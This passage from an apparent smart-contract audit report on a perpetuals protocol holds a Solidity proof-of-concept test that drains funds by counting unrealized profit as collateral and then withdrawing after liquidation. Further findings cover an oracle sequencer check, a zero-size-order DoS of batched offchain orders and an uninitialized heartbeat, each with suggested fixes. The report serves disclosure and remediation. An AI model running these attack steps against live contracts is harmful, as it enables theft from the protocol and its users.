* When this account is liquidated, the `requiredMaintenanceMarginUsdX18` will be deducted from `marginCollateralBalance`, so the remaining would be `46_394_200 - 5_206_016 - liquidation fee = 41_188_179`. Moreover, the position would be entirely closed.
* Now, the attack can withdraw the remaining `marginCollateralBalance` which is equal to `41_188_179`. So, the attacker just paid 1M, but he could steal almost 41M, equal to 40M profit.
* Note that after the second iteration, the account is liquidatable. If after the second iteration, it is liquidated, the attacker would steal `1_368_555$`, equal to `368_555$` profit.

### PoC

The following test shows what explained above.

```solidity
    function test_drainingTheProtocol()
       external
       givenTheSenderIsTheKeeper
       givenTheMarketOrderExists
       givenThePerpMarketIsEnabled
       givenTheSettlementStrategyIsEnabled
       givenTheReportVerificationPasses
       whenTheMarketOrderIdMatches
       givenTheDataStreamsReportIsValid
       givenTheAccountWillMeetTheMarginRequirement
       givenTheMarketsOILimitWontBeExceeded
   {
       TestFuzz_GivenThePnlIsPositive_Context memory ctx;
       ctx.fuzzMarketConfig = getFuzzMarketConfig(ETH_USD_MARKET_ID);

       uint256 marginValueUsd = 1_000_000e18;

       ctx.marketOrderKeeper = marketOrderKeepers[ctx.fuzzMarketConfig.marketId];

       deal({ token: address(usdz), to: users.naruto.account, give: marginValueUsd });

       // attacker creates an account and deposits 1M as collateral
       ctx.tradingAccountId = createAccountAndDeposit(marginValueUsd, address(usdz));

       UD60x18 collat = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId, address(usdz));
       console.log("collateral value before the attack: ", unwrap(collat)); // 1M
       console.log("attakcer's balance before the attack: ", IERC20(address(usdz)).balanceOf(users.naruto.account)); // 0$

       console.log("\nCreating first order\n");

       // Creating the first order
       perpsEngine.createMarketOrder(
           OrderBranch.CreateMarketOrderParams({
               tradingAccountId: ctx.tradingAccountId,
               marketId: ctx.fuzzMarketConfig.marketId,
               sizeDelta: int128(92_000e18) // sizeDelta is 92k
            })
       );

       console.log("\nFilling first order\n");

       // Filling the first order
       ctx.firstMockSignedReport =
           getMockedSignedReport(ctx.fuzzMarketConfig.streamId, ctx.fuzzMarketConfig.mockUsdPrice);
       changePrank({ msgSender: ctx.marketOrderKeeper });
       perpsEngine.fillMarketOrder(ctx.tradingAccountId, ctx.fuzzMarketConfig.marketId, ctx.firstMockSignedReport);

       collat = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId, address(usdz));
       console.log("collateral after first order: ", unwrap(collat));

       for (uint256 i = 1; i < 16; ++i) {
           // assuming that there is a delay of 20 seconds between each order
           // this is just to make the scenario realistic and includes the funding fee in calculation either
           skip(20);

           console.log("\niteration: ", i);
           console.log("");

           // creating order
           changePrank({ msgSender: users.naruto.account });
           perpsEngine.createMarketOrder(
               OrderBranch.CreateMarketOrderParams({
                   tradingAccountId: ctx.tradingAccountId,
                   marketId: ctx.fuzzMarketConfig.marketId,
                   sizeDelta: 60_000e18 // sizeDelat 60k
               })
           );

           // filling the order
           changePrank({ msgSender: ctx.marketOrderKeeper });
           ctx.firstMockSignedReport =
               getMockedSignedReport(ctx.fuzzMarketConfig.streamId, ctx.fuzzMarketConfig.mockUsdPrice);
           perpsEngine.fillMarketOrder(
               ctx.tradingAccountId, ctx.fuzzMarketConfig.marketId, ctx.firstMockSignedReport
           );

           collat = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId, address(usdz));
           console.log("collateral after each iteration: ", unwrap(collat));
       }

       uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
       ctx.tradingAccountId = 1;
       console.log("account id: ", ctx.tradingAccountId);
       console.log("liquidatableAccountsIds: ", liquidatableAccountsIds[0]); // this shows the account ids that are liquidatable

       // liquidating the account
       changePrank({ msgSender: liquidationKeeper });
       uint128[] memory accountsIds = new uint128[](1);
       accountsIds[0] = ctx.tradingAccountId;
       perpsEngine.liquidateAccounts(accountsIds);

       collat = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId, address(usdz));
       console.log("collateral after liquidation: ", unwrap(collat)); // this shows the remaing collateral after the liquidation

       changePrank({ msgSender: users.naruto.account });
       perpsEngine.withdrawMargin(ctx.tradingAccountId, address(usdz), unwrap(collat)); // attacker withdraws its collateral

       // the stolen amounts are transferred to the attacker's balance
       console.log("attacker's final balance: ", IERC20(address(usdz)).balanceOf(users.naruto.account));
   }
```

## Impact

* Draining the protocol.

## Tools Used

## Recommendations

This scenario should be investigated from different point of views:

* Unrealized profit is added to the collateral balance. This collateral balance plays the role for validating the margin requirements. One possible solution is to separate the unrealized profit from the collateral when validating the margin requirements.
* The protocol should not allow a user to increase a position when it is liquidatable (it should be stopped at least in iteration 2). There is some checks for such cases, but it is bypassed because the unrealized profit is added to the collateral and increased the margin balance.


# Medium Risk Findings

## <a id='M-01'></a>M-01. Insufficient checks to confirm the correct status of the sequencerUptimeFeed

_Submitted by [benrai](https://profiles.cyfrin.io/u/benrai), [samuraii77](https://profiles.cyfrin.io/u/samuraii77), [rhaydden](https://profiles.cyfrin.io/u/rhaydden), [kodyvim](https://profiles.cyfrin.io/u/kodyvim), [kalogerone](https://profiles.cyfrin.io/u/kalogerone), [nfmelendez](https://profiles.cyfrin.io/u/nfmelendez), [MSaptarshi007](https://profiles.cyfrin.io/u/MSaptarshi007), [Cryptor](https://profiles.cyfrin.io/u/Cryptor), [akay](https://profiles.cyfrin.io/u/akay), [alexczm](https://profiles.cyfrin.io/u/alexczm), [bube](https://profiles.cyfrin.io/u/bube), [AuditTemple](https://codehawks.cyfrin.io/team/clyo65dx70009vjk4le7hszsf), [0xstalin](https://profiles.cyfrin.io/u/0xstalin), [TeamRockSolid](https://codehawks.cyfrin.io/team/clygyrphg000bl0xpkpo7qch4), [bladesec](https://profiles.cyfrin.io/u/bladesec), [infect3d](https://profiles.cyfrin.io/u/infect3d), [0xabhayy](https://profiles.cyfrin.io/u/0xabhayy), [0x1982us](https://profiles.cyfrin.io/u/0x1982us), [0xdice91](https://profiles.cyfrin.io/u/0xdice91), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro). Selected submission by: [kalogerone](https://profiles.cyfrin.io/u/kalogerone)._      
            


## Summary

The `ChainlinkUtil.sol` contract has `sequencerUptimeFeed` checks in place to assert if the sequencer on `Arbitrum` is running, but these checks are not implemented correctly. Since the protocol implements some checks for the `sequencerUptimeFeed` status, it should implement all of the checks.

## Vulnerability Details

The [chainlink docs](https://docs.chain.link/data-feeds/l2-sequencer-feeds) say that `sequencerUptimeFeed` can return a 0 value for `startedAt` if it is called during an "invalid round".

> * startedAt: This timestamp indicates when the sequencer changed status. This timestamp returns `0` if a round is invalid. When the sequencer comes back up after an outage, wait for the `GRACE_PERIOD_TIME` to pass before accepting answers from the data feed. Subtract `startedAt` from `block.timestamp` and revert the request if the result is less than the `GRACE_PERIOD_TIME`.

Please note that an "invalid round" is described to mean there was a problem updating the sequencer's status, possibly due to network issues or problems with data from oracles, and is shown by a `startedAt` time of 0 and `answer` is 0. Further explanation can be seen as given by an official chainlink engineer as seen here in the chainlink public discord:

[Chainlink Discord Message](https://discord.com/channels/592041321326182401/605768708266131456/1213847312141525002) (must be a member of the Chainlink Discord Channel to view)

Bharath | Chainlink Labs — 03/03/2024 3:55 PM:

> Hello, @EricTee An "invalid round" means there was a problem updating the sequencer's status, possibly due to network issues or problems with data from oracles, and is shown by a `startedAt` time of 0. Normally, when a round starts, `startedAt` is recorded, and the initial status (`answer`) is set to `0`. Later, both the answer and the time it was updated (`updatedAt`) are set at the same time after getting enough data from oracles, making sure that answer only changes from `0` when there's a confirmed update different from the start time. This process helps avoid mistakes in judging if the sequencer is available, which could cause security issues. Making sure `startedAt` isn't `0` is crucial for keeping the system secure and properly informed about the sequencer's status.

Quoting Chainlink's developer final statement:
"Making sure `startedAt` isn't `0` is crucial for keeping the system secure and properly informed about the sequencer's status."

This also makes the implemented check below in the `ChainlinkUtil::getPrice` to be useless if its called in an invalid round:

```js
                uint256 timeSinceUp = block.timestamp - startedAt;
                if (timeSinceUp <= Constants.SEQUENCER_GRACE_PERIOD_TIME) {
                    revert Errors.GracePeriodNotOver();
                }
```

as `startedAt` will be `0`, the arithmetic operation `block.timestamp - startedAt` will result in a value greater than `SEQUENCER_GRACE_PERIOD_TIME` (which is hardcoded to be 3600) i.e block.timestamp = 1719739032, so 1719739032 - 0 = 1719739032 which is bigger than 3600. The code won't revert.

Imagine a case where a round starts, at the beginning `startedAt` is recorded to be 0, and `answer`, the initial status is set to be `0`. Note that docs say that if `answer = 0`, sequencer is up, if equals to `1`, sequencer is down. But in this case here, `answer` and `startedAt` can be `0` initially, till after all data is gotten from oracles and update is confirmed then the values are reset to the correct values that show the correct status of the sequencer.

From these explanations and information, it can be seen that `startedAt` value is a second value that should be used in the check for if a sequencer is down/up or correctly updated. The checks in `ChainlinkUtil::getPrice` will allow for sucessfull calls in an invalid round because reverts dont happen if `answer == 0` and `startedAt == 0` thus defeating the purpose of having a `sequencerFeed` check to assert the status of the `sequencerFeed` on L2 i.e if it is up/down/active or if its status is actually confirmed to be either.

There was also recently a [pull request](https://github.com/smartcontractkit/documentation/pull/1995) to update the [chainlink docs](https://docs.chain.link/data-feeds/l2-sequencer-feeds) sample code with this information, because this check should clearly be displayed there as well.

## Impact

Inadequate checks to confirm the correct status of the `sequencerUptimeFeed` in `ChainlinkUtil::getPrice` contract will cause `getPrice()` to not revert even when the sequencer uptime feed is not updated or is called in an invalid round.

## Tools Used

Manual Review

## Recommendations

```diff
ChainlinkUtil.sol

    function getPrice(
        IAggregatorV3 priceFeed,
        uint32 priceFeedHeartbeatSeconds,
        IAggregatorV3 sequencerUptimeFeed
    )
        internal
        view
        returns (UD60x18 price)
    {
        uint8 priceDecimals = priceFeed.decimals();
        // should revert if priceDecimals > 18
        if (priceDecimals > Constants.SYSTEM_DECIMALS) {
            revert Errors.InvalidOracleReturn();
        }

        if (address(sequencerUptimeFeed) != address(0)) {
            try sequencerUptimeFeed.latestRoundData() returns (
                uint80, int256 answer, uint256 startedAt, uint256, uint80
            ) {
                bool isSequencerUp = answer == 0;
                if (!isSequencerUp) {
                    revert Errors.OracleSequencerUptimeFeedIsDown(address(sequencerUptimeFeed));
                }

+               if (startedAt == 0){
+                   revert();
+               }

                uint256 timeSinceUp = block.timestamp - startedAt;
                if (timeSinceUp <= Constants.SEQUENCER_GRACE_PERIOD_TIME) {
                    revert Errors.GracePeriodNotOver();
                }
            } catch {
                revert Errors.InvalidSequencerUptimeFeedReturn();
            }
        }
        .
        .
        .
```

## <a id='M-02'></a>M-02. A malicious User can DOS all offchain orders making them unexecutable and leaving the protocol in an insolvent state. Also all offchain Trades can also be DOSed for honest parties that do not meet the fillorder requirements (no try and catch)

_Submitted by [topstar](https://profiles.cyfrin.io/u/topstar), [0xaman](https://profiles.cyfrin.io/u/0xaman), [samuraii77](https://profiles.cyfrin.io/u/samuraii77), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [bigsam](https://profiles.cyfrin.io/u/bigsam), [giraffe0x](https://profiles.cyfrin.io/u/giraffe0x), [greed](https://profiles.cyfrin.io/u/greed), [spearmint](https://profiles.cyfrin.io/u/spearmint), [pelz](https://profiles.cyfrin.io/u/pelz), [0xHabanero](https://profiles.cyfrin.io/u/0xHabanero), [MrCrowNFT](https://profiles.cyfrin.io/u/MrCrowNFT), [AllTooWell](https://codehawks.cyfrin.io/team/clvmefpm30001oev62qxtl4zt), [AuditTemple](https://codehawks.cyfrin.io/team/clyo65dx70009vjk4le7hszsf), [joshuajee](https://profiles.cyfrin.io/u/joshuajee), [0xbug](https://profiles.cyfrin.io/u/0xbug), [josh4324](https://profiles.cyfrin.io/u/josh4324), [fyamf](https://profiles.cyfrin.io/u/fyamf), [draiakoo](https://profiles.cyfrin.io/u/draiakoo), [forgebyola](https://profiles.cyfrin.io/u/forgebyola), [bladesec](https://profiles.cyfrin.io/u/bladesec), [0xstalin](https://profiles.cyfrin.io/u/0xstalin), [0x00a](https://profiles.cyfrin.io/u/0x00a), [benrai](https://profiles.cyfrin.io/u/benrai), [0xabhayy](https://profiles.cyfrin.io/u/0xabhayy), [nikhil20](https://profiles.cyfrin.io/u/nikhil20), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro), [seraviz](https://profiles.cyfrin.io/u/seraviz). Selected submission by: [bigsam](https://profiles.cyfrin.io/u/bigsam)._      
            


## Summary

A malicious user can DOS all offchain orders, leaving the protocol insolvent. They exploit the lack of simulation for limit orders (limit/take profit/ stop limit) by creating zero-trade size orders. These are batched and executed once price criteria are met, causing repeated DOS attacks at low cost.&#x20;

## Vulnerability Details

A malicious user can exploit the current implementation of offchain orders by creating multiple offchain orders with a trade size of 0. This can lead to a Denial of Service (DoS) on the offchain order execution process, causing significant disruptions in the protocol's operation. The primary issues are:

1\. \*\*Zero-Size Orders\*\*: Malicious users can create offchain orders with a trade size of 0, which can cause the entire batch of offchain orders to fail during execution.

2\. \*\*Validation are done\*\*: Offchain orders are validated on chain at the point of execution before being included in the batch for onchain execution, making it possible for invalid orders to be processed (DOS for batched transactions).

 

Offchain order are batched together on chain before execution and executed once this gives room for exploit and DOSing the entire cached transactions.

```Solidity
@audit>> note >>> /// @notice Fills pending, eligible offchain offchain orders targeting the given market id.
    /// @dev If a trading account id owner transfers their account to another address, all offchain orders will be
    /// considered cancelled.
    /// @param marketId The perp market id.
    /// @param offchainOrders The array of signed custom orders.
    /// @param priceData The price data of custom orders.
    function fillOffchainOrders(
        uint128 marketId,

      @audit>> batched transactions >>>        OffchainOrder.Data[] calldata offchainOrders,
       
      bytes calldata priceData
    )
        external
        onlyOffchainOrdersKeeper(marketId)
    {
        // working data
        FillOffchainOrders_Context memory ctx;

        // fetch storage slot for perp market's offchain order config
        SettlementConfiguration.Data storage settlementConfiguration =
            SettlementConfiguration.load(marketId, SettlementConfiguration.OFFCHAIN_ORDERS_CONFIGURATION_ID);

        // fetch storage slot for perp market
        PerpMarket.Data storage perpMarket = PerpMarket.load(marketId);

        // fetch storage slot for global config
        GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();

        // verifies provided price data following the configured settlement strategy
        // returning the bid and ask prices
        (ctx.bidX18, ctx.askX18) =
            settlementConfiguration.verifyOffchainPrice(priceData, globalConfiguration.maxVerificationDelay);

        // iterate through off-chain orders; intentionally not caching
        // length as reading from calldata is faster
      
@audit>> loop >>>         for (uint256 i; i < offchainOrders.length; i++) {
            ctx.offchainOrder = offchainOrders[i];

            // enforce size > 0

  
@audit>> DOS attack possible revertion in loop during validation>>>          if (ctx.offchainOrder.sizeDelta == 0) {
                revert Errors.ZeroInput("offchainOrder.sizeDelta");
            }

            // load existing trading account; reverts for non-existent account
            TradingAccount.Data storage tradingAccount =

  @audit>> DOS attack possible revertion in loop during validation >>>                          TradingAccount.loadExisting(ctx.offchainOrder.tradingAccountId);

  
                       // enforce that keeper is filling the order for the correct marketId
  
  @audit>> DOS attack possible revertion in loop during validation  >>>               if (marketId != ctx.offchainOrder.marketId) {
                revert Errors.OrderMarketIdMismatch(marketId, ctx.offchainOrder.marketId);
            }

            // First we check if the nonce is valid, as a first measure to protect from replay attacks, according to
            // the offchain order's type (each type may have its own business logic).
            // e.g TP/SL must increase the nonce in order to prevent older limit orders from being filled.
            // NOTE: Since the nonce isn't always increased, we also need to store the typed data hash containing the
            // 256-bit salt value to fully prevent replay attacks.

  
  @audit>> DOS attack possible revertion in loop during validation  >>>            if (ctx.offchainOrder.nonce != tradingAccount.nonce) {
                revert Errors.InvalidSignedNonce(tradingAccount.nonce, ctx.offchainOrder.nonce);
            }

            ctx.structHash = keccak256(
                abi.encode(
                    Constants.CREATE_OFFCHAIN_ORDER_TYPEHASH,
                    ctx.offchainOrder.tradingAccountId,
                    ctx.offchainOrder.marketId,
                    ctx.offchainOrder.sizeDelta,
                    ctx.offchainOrder.targetPrice,
                    ctx.offchainOrder.shouldIncreaseNonce,
                    ctx.offchainOrder.nonce,
                    ctx.offchainOrder.salt
                )
            );

            // If the offchain order has already been filled, revert.
            // we store `ctx.hash`, and expect each order signed by the user to provide a unique salt so that filled
            // orders can't be replayed regardless of the account's nonce.
           
  @audit>> DOS attack possible revertion in loop during validation  >>>       if (tradingAccount.hasOffchainOrderBeenFilled[ctx.structHash]) {
                revert Errors.OrderAlreadyFilled(ctx.offchainOrder.tradingAccountId, ctx.offchainOrder.salt);
            }

            // `ecrecover`s the order signer.
            ctx.signer = ECDSA.recover(
                _hashTypedDataV4(ctx.structHash), ctx.offchainOrder.v, ctx.offchainOrder.r, ctx.offchainOrder.s
            );

            // ensure the signer is the owner of the trading account, otherwise revert.
            // NOTE: If an account's owner transfers to another address, this will fail. Therefore, clients must
            // cancel all users offchain orders in that scenario.
 
  @audit>> DOS attack possible revertion in loop during validation  >>>                if (ctx.signer != tradingAccount.owner) {
                revert Errors.InvalidOrderSigner(ctx.signer, tradingAccount.owner);
            }

            // cache the order side
            ctx.isBuyOrder = ctx.offchainOrder.sizeDelta > 0;

            //  buy order -> match against the ask price
            // sell order -> match against the bid price
            ctx.indexPriceX18 = ctx.isBuyOrder ? ctx.askX18 : ctx.bidX18;

            // verify the provided price data against the verifier and ensure it's valid, then get the mark price
            // based on the returned index price.
            ctx.fillPriceX18 = perpMarket.getMarkPrice(sd59x18(ctx.offchainOrder.sizeDelta), ctx.indexPriceX18);

            // if the order increases the trading account's position (buy order), the fill price must be less than or
            // equal to the target price, if it decreases the trading account's position (sell order), the fill price
            // must be greater than or equal to the target price.
            ctx.isFillPriceValid = (ctx.isBuyOrder && ctx.offchainOrder.targetPrice <= ctx.fillPriceX18.intoUint256())
                || (!ctx.isBuyOrder && ctx.offchainOrder.targetPrice >= ctx.fillPriceX18.intoUint256());

            // we don't revert here because we want to continue filling other orders.
            if (!ctx.isFillPriceValid) {
                continue;
            }

            // account state updates start here

            // increase the trading account nonce if the order's flag is true.
            if (ctx.offchainOrder.shouldIncreaseNonce) {
                unchecked {
                    tradingAccount.nonce++;
                }
            }

            // mark the offchain order as filled.
            // we store the struct hash to be marked as filled.
            tradingAccount.hasOffchainOrderBeenFilled[ctx.structHash] = true;

            // fill the offchain order.
            _fillOrder(
                ctx.offchainOrder.tradingAccountId,
                marketId,
                SettlementConfiguration.OFFCHAIN_ORDERS_CONFIGURATION_ID,
                sd59x18(ctx.offchainOrder.sizeDelta),
                ctx.fillPriceX18
            );
        }
    }

 
```

Market orders are simulated therefore there are little or no checks within fill market order because of the simulation function.&#x20;

NOTE offchain orders are batched hence these DOS attack is possible.&#x20;

For honest users  -

1. Also if the DOS / revertion do occur. here below are the areas where a reversion can still be triggered WHEN FILLING THE ORDER. 

```Solidity
 /// @param tradingAccountId The trading account id.
    /// @param marketId The perp market id.
    /// @param settlementConfigurationId The perp market settlement configuration id.
    /// @param sizeDeltaX18 The size delta of the order normalized to 18 decimals.
    /// @param fillPriceX18 The fill price of the order normalized to 18 decimals.
    function _fillOrder(
        uint128 tradingAccountId,
        uint128 marketId,
        uint128 settlementConfigurationId,
        SD59x18 sizeDeltaX18,
        UD60x18 fillPriceX18
    )
        internal
        virtual
    {
      --------------------------------------------------------------

      @audit>>> No try and catch--offchain can revert here/reversion in loop during execution(DOS)>>>    perpMarket.checkTradeSize(sizeDeltaX18);
      ------------------------------------------------------------------------
        
      
      @audit>>>No try and catch--offchain can revert here/reversion in loop during execution(DOS)>>>     // reverts if the trader can't satisfy the appropriate margin requirement
          
                tradingAccount.validateMarginRequirement(
                ctx.requiredMarginUsdX18,
                tradingAccount.getMarginBalanceUsd(accountTotalUnrealizedPnlUsdX18),
                ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18)
            );
        }
     ----------------------------------------------------------------------

      @audit>>> No try and catch--offchain can revert here/reversion in loop during execution(DOS)>>>     // enforce open interest and skew limits for target market and calculate
      
               // new open interest and new skew
                (ctx.newOpenInterestX18, ctx.newSkewX18) =
                perpMarket.checkOpenInterestLimits(sizeDeltaX18, ctx.oldPositionSizeX18, ctx.newPositionSizeX18);
```

## Impact

1\. \*\*Delayed Execution\*\*: Valid orders may be executed late, potentially filling orders at prices significantly different from the target price.

2\. \*\*Insolvency Risk\*\*: The protocol could become insolvent if valid orders are consistently delayed or unexecuted.

## Tools Used

\- Manual Solidity code analysis

## Recommendations

1. To mitigate this issue, implement an error emision and order skipping mechanism for batched offchain orders. Ensure that only orders meeting all criteria are met for onchain execution.
2. Consider nesting \_fillOrder in a try and catch statement IN THE OFFCHAIN EXECUTION  to prevent a complete DOS/revertion of all orders Knowing fully well that some orders are ok.

### Explanation of Changes

1. **Error Handling with `try-catch`**: The `_fillOrder` function call is now wrapped in a `try-catch` block. If `_fillOrder` fails, an `OrderError` event is emitted, and the loop continues to the next order.
2. \*\*Reverting Changes on Failure \*\*:  Reversion for ONCHAIN order reverts all actions when a reversion occurs during execution thus If `_fillOrder` fails for offchain:

   * The order is unmarked as filled.
   * The nonce is decremented if it was incremented earlier.

This ensures that a failure in `_fillOrder` does not revert the entire iteration and allows other orders to be processed.

```Solidity

/// @notice Fills pending, eligible offchain orders targeting the given market id.
/// @dev If a trading account id owner transfers their account to another address, all offchain orders will be
/// considered cancelled.
/// @param marketId The perp market id.
/// @param offchainOrders The array of signed custom orders.
/// @param priceData The price data of custom orders.
function fillOffchainOrders(
    uint128 marketId,
    OffchainOrder.Data[] calldata offchainOrders,
    bytes calldata priceData
)
    external
    onlyOffchainOrdersKeeper(marketId)
{
    // working data
    FillOffchainOrders_Context memory ctx;

    // fetch storage slot for perp market's offchain order config
    SettlementConfiguration.Data storage settlementConfiguration =
        SettlementConfiguration.load(marketId, SettlementConfiguration.OFFCHAIN_ORDERS_CONFIGURATION_ID);

    // fetch storage slot for perp market
    PerpMarket.Data storage perpMarket = PerpMarket.load(marketId);

    // fetch storage slot for global config
    GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();

    // verifies provided price data following the configured settlement strategy
    // returning the bid and ask prices
    (ctx.bidX18, ctx.askX18) =
        settlementConfiguration.verifyOffchainPrice(priceData, globalConfiguration.maxVerificationDelay);

    // iterate through off-chain orders; intentionally not caching
    // length as reading from calldata is faster
    for (uint256 i; i < offchainOrders.length; i++) {
        ctx.offchainOrder = offchainOrders[i];
      
      // enforce size > 0
--            if (ctx.offchainOrder.sizeDelta == 0) {
--                revert Errors.ZeroInput("offchainOrder.sizeDelta");
--            }
      
        // enforce size > 0
++        if (ctx.offchainOrder.sizeDelta == 0) {
++         emit OrderError(i, "Zero sizeDelta");
++            continue;
++        }

       
       // load existing trading account; reverts for non-existent account
--            TradingAccount.Data storage tradingAccount =
--               TradingAccount.loadExisting(ctx.offchainOrder.tradingAccountId);

++       // load existing trading account; reverts for non-existent account
++       TradingAccount.Data storage tradingAccount;

++        try TradingAccount.loadExisting(ctx.offchainOrder.tradingAccountId) returns 
++     (TradingAccount.Data storage account) {
++            tradingAccount = account;
++       } catch {
++         emit OrderError(i, "Non-existent trading account");
++         continue;
        }

        // enforce that keeper is filling the order for the correct marketId
        if (marketId != ctx.offchainOrder.marketId) {

--        revert Errors.OrderMarketIdMismatch(marketId, ctx.offchainOrder.marketId);
          
++          emit OrderError(i, "Order marketId mismatch");
++          continue;
        }

        // First we check if the nonce is valid, as a first measure to protect from replay attacks, according to
        // the offchain order's type (each type may have its own business logic).
        // e.g TP/SL must increase the nonce in order to prevent older limit orders from being filled.
        // NOTE: Since the nonce isn't always increased, we also need to store the typed data hash containing the
        // 256-bit salt value to fully prevent replay attacks.
        if (ctx.offchainOrder.nonce != tradingAccount.nonce) {

--       revert Errors.InvalidSignedNonce(tradingAccount.nonce, ctx.offchainOrder.nonce);
++            emit OrderError(i, "Invalid signed nonce");
++           continue;
        }

        ctx.structHash = keccak256(
            abi.encode(
                Constants.CREATE_OFFCHAIN_ORDER_TYPEHASH,
                ctx.offchainOrder.tradingAccountId,
                ctx.offchainOrder.marketId,
                ctx.offchainOrder.sizeDelta,
                ctx.offchainOrder.targetPrice,
                ctx.offchainOrder.shouldIncreaseNonce,
                ctx.offchainOrder.nonce,
                ctx.offchainOrder.salt
            )
        );

        // If the offchain order has already been filled, revert.
        // we store `ctx.hash`, and expect each order signed by the user to provide a unique salt so that filled
        // orders can't be replayed regardless of the account's nonce.
        if (tradingAccount.hasOffchainOrderBeenFilled[ctx.structHash]) {

--          revert Errors.OrderAlreadyFilled(ctx.offchainOrder.tradingAccountId, ctx.offchainOrder.salt);

++            emit OrderError(i, "Order already filled");
++            continue;
        }

        // `ecrecover`s the order signer.
        ctx.signer = ECDSA.recover(
            _hashTypedDataV4(ctx.structHash), ctx.offchainOrder.v, ctx.offchainOrder.r, ctx.offchainOrder.s
        );

        // ensure the signer is the owner of the trading account, otherwise revert.
        // NOTE: If an account's owner transfers to another address, this will fail. Therefore, clients must
        // cancel all users offchain orders in that scenario.
        if (ctx.signer != tradingAccount.owner) {

--           revert Errors.InvalidOrderSigner(ctx.signer, tradingAccount.owner);          
          
++            emit OrderError(i, "Invalid order signer");
++            continue;
        }

        // cache the order side
        ctx.isBuyOrder = ctx.offchainOrder.sizeDelta > 0;

        // buy order -> match against the ask price
        // sell order -> match against the bid price
        ctx.indexPriceX18 = ctx.isBuyOrder ? ctx.askX18 : ctx.bidX18;

        // verify the provided price data against the verifier and ensure it's valid, then get the mark price
        // based on the returned index price.
        ctx.fillPriceX18 = perpMarket.getMarkPrice(sd59x18(ctx.offchainOrder.sizeDelta), ctx.indexPriceX18);

        // if the order increases the trading account's position (buy order), the fill price must be less than or
        // equal to the target price, if it decreases the trading account's position (sell order), the fill price
        // must be greater than or equal to the target price.
        ctx.isFillPriceValid = (ctx.isBuyOrder && ctx.offchainOrder.targetPrice <= ctx.fillPriceX18.intoUint256())
            || (!ctx.isBuyOrder && ctx.offchainOrder.targetPrice >= ctx.fillPriceX18.intoUint256());

        // we don't revert here because we want to continue filling other orders.
        if (!ctx.isFillPriceValid) {     
          
++         emit OrderError(i, "Invalid fill price");
          continue;
        }

        // account state updates start here

        // increase the trading account nonce if the order's flag is true or if the position is being reduced.
        if (ctx.offchainOrder.shouldIncreaseNonce) {
            unchecked {
                tradingAccount.nonce++;
            }
        }

        // mark the offchain order as filled.
        // we store the struct hash to be marked as filled.
        tradingAccount.hasOffchainOrderBeenFilled[ctx.structHash] = true;

--      _fillOrder(
--                ctx.offchainOrder.tradingAccountId,
--                marketId,
--                SettlementConfiguration.OFFCHAIN_ORDERS_CONFIGURATION_ID,
--                sd59x18(ctx.offchainOrder.sizeDelta),
--                ctx.fillPriceX18
--            );

      
        // try to fill the offchain order and catch any potential errors
++        try this._fillOrder(
++            ctx.offchainOrder.tradingAccountId,
++            marketId,
++            SettlementConfiguration.OFFCHAIN_ORDERS_CONFIGURATION_ID,
++            sd59x18(ctx.offchainOrder.sizeDelta),
++            ctx.fillPriceX18
++        ) {
++            // if _fillOrder fails, emit an error and continue with the next order
++        } catch {
++            emit OrderError(i, "Failed to fill order");
++            // revert the marking of the order as filled since the actual fill failed
++            tradingAccount.hasOffchainOrderBeenFilled[ctx.structHash] = false;
++            // revert the nonce increment if it was done
++            if (ctx.offchainOrder.shouldIncreaseNonce) {
++                unchecked {
++                  tradingAccount.nonce--;
++          }
            }
        }
    }
}
```

## <a id='M-03'></a>M-03. An Uninitialized Variable In The `MarketConfiguration::update` Function Causes The `PrepMarket::getIndexPrice` Function To Revert

_Submitted by [codexnature](https://profiles.cyfrin.io/u/codexnature), [benrai](https://profiles.cyfrin.io/u/benrai), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [Panthers](https://codehawks.cyfrin.io/team/clyq3gq8c0001z8dg8uaaygxi), [forgetfore1](https://profiles.cyfrin.io/u/forgetfore1), [T1MOH](https://profiles.cyfrin.io/u/T1MOH), [Fortis Audits](https://codehawks.cyfrin.io/team/cly2eas2s000gpgez427qfcw9), [TeamRockSolid](https://codehawks.cyfrin.io/team/clygyrphg000bl0xpkpo7qch4), [alexczm](https://profiles.cyfrin.io/u/alexczm), [4th05](https://profiles.cyfrin.io/u/4th05), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [n0kto](https://profiles.cyfrin.io/u/n0kto), [brene](https://profiles.cyfrin.io/u/brene), [bladesec](https://profiles.cyfrin.io/u/bladesec), [AuditTemple](https://codehawks.cyfrin.io/team/clyo65dx70009vjk4le7hszsf), [0xleadwizard](https://profiles.cyfrin.io/u/0xleadwizard), [unRekt](https://codehawks.cyfrin.io/team/clygqij4y001bgabeovyj6hg2). Selected submission by: [Fortis Audits](https://codehawks.cyfrin.io/team/cly2eas2s000gpgez427qfcw9)._      
            


## Summary:

The `update` function within the `MarketConfiguration` library fails to update the `priceFeedHeartbeatSeconds` variable, which is essential for the `getIndexPrice` function to operate correctly. This oversight causes the `getIndexPrice` function to always revert due to an uninitialized heartbeat check.

## Vulnerability Detail:

In the `MarketConfiguration` library, the `update` function is designed to update various market configuration parameters. However, it neglects to update the `priceFeedHeartbeatSeconds` variable. Consequently, this variable remains uninitialized, defaulting to zero.

The `getIndexPrice` function relies on the `priceFeedHeartbeatSeconds` variable to validate the timeliness of the price feed data from Chainlink oracles. When it checks `if (block.timestamp - updatedAt > priceFeedHeartbeatSeconds)`, the comparison always results in `true` (since `priceFeedHeartbeatSeconds` is zero), causing the function to revert every time it is called.

## Impact:

This vulnerability significantly impacts the functionality of the protocol by making the price checking mechanism always revert. As a result, it effectively halts the correct operation of any process relying on the `getIndexPrice` function. Specifically, it renders the entire price validation mechanism inoperative, potentially disrupting market operations.

These are the list of functions that got affected by this vulnerability includes:

1. `PerpMarket::getIndexPrice`
2. `TradingAccountBranch::getAccountEquityUsd`
